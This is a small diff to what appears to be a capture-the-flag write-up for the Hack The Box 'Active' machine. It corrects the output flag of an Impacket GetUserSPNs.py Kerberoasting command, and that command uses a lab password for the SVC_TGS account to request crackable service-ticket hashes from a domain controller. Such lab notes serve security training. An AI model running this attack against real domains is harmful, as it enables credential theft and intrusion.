@@ -84,5 +84,5 @@ python GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.
 ## Kerberoast (request ticket)
 Request ticket for account
 ```
-python GetUserSPNs.py ACTIVE.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.57.178 -request -outfile user-spn.hash
+python GetUserSPNs.py ACTIVE.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.57.178 -request -outputfile user-spn.hash
 ```
